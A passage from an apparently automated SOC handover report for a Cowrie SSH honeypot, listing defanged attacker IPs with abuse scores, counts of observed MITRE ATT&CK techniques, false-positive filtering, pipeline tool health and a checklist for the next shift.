| `14.103.149[.]158` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 39 |
| `120.48.87[.]166` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 11 |
| `120.48.60[.]44` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 41 |
| `140.246.70[.]45` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 31 |
| `172.83.83[.]216` | IN | RBDC, Inc. | **100** ⚠️ | 0 |
| `49.174.174[.]10` | KR | LG POWERCOMM | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 36 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 14 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 7 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 44 cases |
| Tool 34  | Credential Extractor        | ✅ 21 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 1 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 13 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (13.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 11 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 7 priority case(s) shown individually · 10 recon entry/entries in table (3 group(s) consolidating 24 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-09T15:21:46Z_
